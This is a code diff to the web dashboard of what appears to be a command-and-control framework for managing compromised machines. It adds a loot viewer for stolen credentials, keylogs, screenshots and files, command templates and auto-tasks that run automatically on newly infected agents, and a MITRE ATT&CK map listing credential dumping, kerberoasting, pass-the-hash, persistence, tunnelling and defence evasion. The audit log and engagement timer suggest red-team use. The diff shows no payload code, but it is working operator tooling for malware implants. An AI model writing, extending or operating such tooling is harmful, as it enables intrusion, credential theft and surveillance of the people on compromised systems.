@@ -315,6 +315,9 @@ tr.clickable { cursor: pointer; }
     <div class="tab" onclick="nav('payloads')">Payloads</div>
     <div class="tab" onclick="nav('files')">Files</div>
     <div class="tab" onclick="nav('creds')">Creds</div>
+    <div class="tab" onclick="nav('loot')">Loot</div>
+    <div class="tab" onclick="nav('templates')">Templates</div>
+    <div class="tab" onclick="nav('audit')">Audit</div>
     <div class="tab" onclick="nav('events')">Events</div>
   </div>
   <div class="topbar-right">
@@ -340,7 +343,10 @@ tr.clickable { cursor: pointer; }
     <button class="sidebar-btn" onclick="nav('payloads')" title="Payloads">🔧<span class="sb-label">Payloads</span></button>
     <button class="sidebar-btn" onclick="nav('files')" title="Files">📂<span class="sb-label">Files</span></button>
     <button class="sidebar-btn" onclick="nav('creds')" title="Credentials">🔑<span class="sb-label">Creds</span></button>
+    <button class="sidebar-btn" onclick="nav('loot')" title="Loot">🎯<span class="sb-label">Loot</span></button>
     <div class="sidebar-divider"></div>
+    <button class="sidebar-btn" onclick="nav('templates')" title="Command Templates">📑<span class="sb-label">Templates</span></button>
+    <button class="sidebar-btn" onclick="nav('audit')" title="Audit Log">📝<span class="sb-label">Audit</span></button>
     <button class="sidebar-btn" onclick="nav('events')" title="Events">📜<span class="sb-label">Events</span></button>
     <div style="flex:1"></div>
     <button class="sidebar-btn" onclick="toggleTheme()" title="Toggle Theme" id="theme-btn">🌙<span class="sb-label">Theme</span></button>
@@ -773,6 +779,72 @@ tr.clickable { cursor: pointer; }
       </div>
     </div>
 
+    <!-- ══════ LOOT ══════ -->
+    <div id="p-loot" class="page">
+      <div class="card">
+        <div class="card-header"><h3><span>🎯</span> Loot Viewer</h3></div>
+        <div class="card-body">
+          <div style="display:flex;gap:8px;margin-bottom:14px">
+            <select id="loot-filter" onchange="loadLoot()" style="padding:8px 12px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px">
+              <option value="all">All Types</option>
+              <option value="credentials">Credentials</option>
+              <option value="file">Files</option>
+              <option value="screenshot">Screenshots</option>
+              <option value="keylog">Keylogs</option>
+              <option value="sysinfo">Sysinfo</option>
+              <option value="output">Shell Output</option>
+            </select>
+            <button class="qbtn" onclick="loadLoot()" style="font-size:12px">Refresh</button>
+          </div>
+          <div id="loot-grid" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(350px,1fr));gap:12px"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══════ TEMPLATES ══════ -->
+    <div id="p-templates" class="page">
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px">
+        <div class="card">
+          <div class="card-header"><h3><span>📑</span> Command Templates</h3></div>
+          <div class="card-body" id="template-list"></div>
+        </div>
+        <div class="card">
+          <div class="card-header"><h3><span>🛡️</span> MITRE ATT&CK Mapping</h3></div>
+          <div class="card-body">
+            <div style="font-size:12px;color:var(--text-muted);margin-bottom:12px">Commands are mapped to MITRE ATT&CK techniques</div>
+            <div id="mitre-map" style="display:grid;grid-template-columns:1fr 1fr;gap:6px"></div>
+          </div>
+        </div>
+      </div>
+      <div class="card" style="margin-top:14px">
+        <div class="card-header"><h3><span>⚡</span> Auto-Tasks (Run on New Agent)</h3></div>
+        <div class="card-body">
+          <div style="display:flex;gap:8px;margin-bottom:12px">
+            <select id="at-cmd" style="padding:8px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;width:150px">
+              <option value="sysinfo">sysinfo</option>
+              <option value="shell">shell</option>
+              <option value="ps">ps</option>
+              <option value="screenshot">screenshot</option>
+            </select>
+            <input id="at-args" placeholder="args (optional)" style="flex:1;padding:8px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px">
+            <button class="qbtn" onclick="addAutoTask()" style="padding:8px 14px;font-size:12px">+ Add</button>
+          </div>
+          <div id="autotask-list"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══════ AUDIT ══════ -->
+    <div id="p-audit" class="page">
+      <div class="card">
+        <div class="card-header"><h3><span>📝</span> Operator Audit Log</h3></div>
+        <div class="card-body"><table>
+          <thead><tr><th>Time</th><th>Operator</th><th>Agent</th><th>Action</th><th>Detail</th></tr></thead>
+          <tbody id="audit-table"></tbody>
+        </table></div>
+      </div>
+    </div>
+
     <!-- ══════ EVENTS ══════ -->
     <div id="p-events" class="page">
       <div class="card">
@@ -845,7 +917,7 @@ async function refreshAll() {
   if (agents.length > 0) {
     wrap.innerHTML = '<div class="agent-grid">' + agents.map(a =>
       '<div class="agent-card" onclick="selectAgent(\''+a.name+'\')">' +
-      '<div class="agent-top"><div><div class="agent-name">'+a.name+'</div>' +
+      '<div class="agent-top"><div><div class="agent-name">'+a.name+' <span onclick="event.stopPropagation();renameAgent(\''+a.name+'\')" style="font-size:10px;cursor:pointer;color:var(--text-muted);margin-left:4px" title="Rename">✏️</span></div>' +
       '<div class="agent-os">'+osIcon(a.os)+' '+a.os+'</div></div>' +
       badge(a.status) + '</div>' +
       '<div class="agent-details">' +
@@ -1796,6 +1868,158 @@ async function generatePayload() {
   btn.disabled = false;
 }
 
+// ──── Loot Viewer ────
+async function loadLoot() {
+  const grid = document.getElementById('loot-grid');
+  if (!grid) return;
+  grid.innerHTML = '<div style="color:var(--text-muted);padding:20px;text-align:center">Loading loot...</div>';
+  try {
+    const loot = await fetchJ('/api/loot');
+    const filter = document.getElementById('loot-filter').value;
+    const filtered = filter === 'all' ? loot : loot.filter(l => l.type === filter);
+    if (filtered.length === 0) {
+      grid.innerHTML = '<div style="color:var(--text-muted);padding:40px;text-align:center;grid-column:1/-1">No loot collected yet. Execute commands to capture output.</div>';
+      return;
+    }
+    const typeIcons = {credentials:'🔑',file:'📄',screenshot:'📸',keylog:'⌨️',sysinfo:'💻',output:'📋'};
+    const typeColors = {credentials:'var(--green)',file:'var(--blue)',screenshot:'var(--cyan)',keylog:'var(--yellow)',sysinfo:'var(--accent-light)',output:'var(--text-muted)'};
+    grid.innerHTML = filtered.map(l =>
+      '<div style="background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius-lg);overflow:hidden">' +
+      '<div style="padding:12px 16px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center">' +
+      '<div><span style="font-size:16px">'+( typeIcons[l.type]||'📋')+'</span> <strong style="color:'+(typeColors[l.type]||'var(--text-primary)')+'">'+l.type.toUpperCase()+'</strong></div>' +
+      '<div style="font-size:11px;color:var(--text-muted)">'+l.agent+' · '+l.time+'</div></div>' +
+      '<div style="padding:8px 16px;font-size:11px;color:var(--text-secondary);font-family:monospace">'+l.command+'</div>' +
+      '<pre style="margin:0;padding:12px 16px;font-size:11px;max-height:200px;overflow-y:auto;background:var(--bg-input);border:none;border-radius:0">'+l.output.substring(0,1000)+'</pre>' +
+      '<div style="padding:6px 16px;font-size:10px;color:var(--text-muted);border-top:1px solid var(--border)">'+l.size+' bytes</div></div>'
+    ).join('');
+  } catch(e) { grid.innerHTML = '<div style="color:var(--red);">'+e.message+'</div>'; }
+}
+
+// ──── Command Templates ────
+async function loadTemplates() {
+  const list = document.getElementById('template-list');
+  if (!list) return;
+  try {
+    const templates = await fetchJ('/api/templates');
+    list.innerHTML = templates.map((t,i) =>
+      '<div style="background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);padding:14px;margin-bottom:8px">' +
+      '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">' +
+      '<div><strong style="color:var(--accent-light)">'+t.name+'</strong> <span style="font-size:10px;color:var(--text-muted);background:var(--bg-hover);padding:2px 6px;border-radius:4px;margin-left:6px">'+t.category+'</span></div>' +
+      '<button class="qbtn" onclick="runTemplate('+i+')" style="font-size:11px;padding:4px 12px;background:var(--accent-glow);color:var(--accent-light)">Run All</button></div>' +
+      '<div style="font-family:monospace;font-size:11px;color:var(--text-secondary);line-height:1.8">' +
+      t.commands.map(c => '<div style="padding:2px 0">$ '+c+'</div>').join('') + '</div></div>'
+    ).join('');
+  } catch(e) { list.innerHTML = '<div style="color:var(--red)">'+e.message+'</div>'; }
+}
+
+async function runTemplate(idx) {
+  const agent = document.getElementById('agent-select').value;
+  if (!agent) { alert('Select an agent in the Terminal tab first'); return; }
+  const templates = await fetchJ('/api/templates');
+  const t = templates[idx];
+  if (!t) return;
+  nav('terminal');
+  for (const cmd of t.commands) {
+    const parts = cmd.split(' ');
+    const command = parts[0];
+    const args = parts.slice(1).join(' ');
+    await fetch('/api/cmd', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({agent:agent, command:command, args:args})});
+    termLog('system', '→ ' + cmd);
+    await new Promise(r => setTimeout(r, 500));
+  }
+  termLog('success', '✓ Template "'+t.name+'" executed ('+t.commands.length+' commands)');
+}
+
+// ──── MITRE ATT&CK Mapping ────
+const mitreMap = [
+  {id:'T1059',name:'Command & Scripting',commands:['shell','ps']},
+  {id:'T1082',name:'System Information',commands:['sysinfo']},
+  {id:'T1113',name:'Screen Capture',commands:['screenshot']},
+  {id:'T1005',name:'Data from Local System',commands:['download']},
+  {id:'T1056.001',name:'Keylogging',commands:['keylog']},
+  {id:'T1003',name:'OS Credential Dumping',commands:['creds','ad-dump-sam','ad-dump-lsa']},
+  {id:'T1558',name:'Kerberoasting',commands:['ad-kerberoast','ad-asreproast']},
+  {id:'T1021',name:'Remote Services',commands:['ad-psexec','ad-wmi','ad-winrm','pivot']},
+  {id:'T1134',name:'Access Token Manipulation',commands:['token']},
+  {id:'T1547',name:'Boot/Logon Autostart',commands:['persist']},
+  {id:'T1572',name:'Protocol Tunneling',commands:['socks','portfwd']},
+  {id:'T1562',name:'Impair Defenses',commands:['evasion']},
+  {id:'T1557',name:'LLMNR/NBT-NS Poisoning',commands:['ad-pass-the-hash']},
+  {id:'T1069',name:'Permission Groups Discovery',commands:['ad-enum-groups','ad-enum-admins']},
+  {id:'T1018',name:'Remote System Discovery',commands:['ad-enum-computers']},
+  {id:'T1033',name:'System Owner/User Discovery',commands:['ad-enum-users']},
+];
+
+function renderMitre() {
+  const el = document.getElementById('mitre-map');
+  if (!el) return;
+  el.innerHTML = mitreMap.map(m =>
+    '<div style="background:var(--bg-input);border:1px solid var(--border);border-radius:6px;padding:8px 10px">' +
+    '<div style="font-size:10px;color:var(--cyan);font-weight:600">'+m.id+'</div>' +
+    '<div style="font-size:11px;color:var(--text-primary);margin-top:2px">'+m.name+'</div>' +
+    '<div style="font-size:10px;color:var(--text-muted);margin-top:3px;font-family:monospace">'+m.commands.join(', ')+'</div></div>'
+  ).join('');
+}
+
+// ──── Auto-Tasks ────
+async function loadAutoTasks() {
+  const list = document.getElementById('autotask-list');
+  if (!list) return;
+  try {
+    const tasks = await fetchJ('/api/autotasks');
+    if (tasks.length === 0) {
+      list.innerHTML = '<div style="color:var(--text-muted);font-size:12px;text-align:center;padding:12px">No auto-tasks configured. New agents will check in without running any commands.</div>';
+      return;
+    }
+    list.innerHTML = tasks.map((t,i) =>
+      '<div style="display:flex;align-items:center;justify-content:space-between;padding:8px 12px;background:var(--bg-input);border:1px solid var(--border);border-radius:6px;margin-bottom:4px">' +
+      '<span style="font-family:monospace;font-size:12px;color:var(--text-primary)">'+t.command+' '+t.args+'</span>' +
+      '<button class="qbtn" onclick="removeAutoTask('+i+')" style="color:var(--red);font-size:10px;padding:3px 8px">✕</button></div>'
+    ).join('');
+  } catch(e) {}
+}
+
+async function addAutoTask() {
+  const cmd = document.getElementById('at-cmd').value;
+  const args = document.getElementById('at-args').value;
+  await fetch('/api/autotasks', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({action:'add', command:cmd, args:args})});
+  document.getElementById('at-args').value = '';
+  loadAutoTasks();
+}
+
+async function removeAutoTask(idx) {
+  await fetch('/api/autotasks', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({action:'remove', index:idx})});
+  loadAutoTasks();
+}
+
+// ──── Audit Log ────
+async function loadAuditLog() {
+  const table = document.getElementById('audit-table');
+  if (!table) return;
+  try {
+    const log = await fetchJ('/api/auditlog');
+    if (log.length === 0) {
+      table.innerHTML = '<tr><td colspan="5" style="text-align:center;color:var(--text-muted);padding:24px">No operations logged yet. Send commands to agents to populate the audit trail.</td></tr>';
+      return;
+    }
+    table.innerHTML = log.slice().reverse().map(e =>
+      '<tr><td style="font-family:monospace;font-size:12px;color:var(--text-muted)">'+e.time+'</td>' +
+      '<td style="color:var(--accent-light);font-weight:600">'+e.operator+'</td>' +
+      '<td>'+e.agent+'</td>' +
+      '<td><span style="color:var(--cyan);font-size:11px;font-weight:600;text-transform:uppercase">'+e.action+'</span></td>' +
+      '<td style="font-family:monospace;font-size:12px;max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">'+e.detail+'</td></tr>'
+    ).join('');
+  } catch(e) {}
+}
+
+// ──── Agent Rename ────
+async function renameAgent(agentName) {
+  const newName = prompt('Rename agent "'+agentName+'" to:');
+  if (!newName || !newName.trim()) return;
+  await fetch('/api/agent/rename', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({agent:agentName, new_name:newName.trim()})});
+  refreshAll();
+}
+
 // ──── Engagement Timer ────
 const engagementStart = Date.now();
 function updateTimer() {
@@ -1969,8 +2193,15 @@ async function removeAgent(agentId) {
 
 // ──── Init ────
 renderCreds();
+renderMitre();
+loadTemplates();
+loadAutoTasks();
+loadAuditLog();
+loadLoot();
 refreshAll();
 setInterval(refreshAll, 4000);
+setInterval(loadAuditLog, 10000);
+setInterval(loadLoot, 15000);
 </script>
 </body>
 </html>`
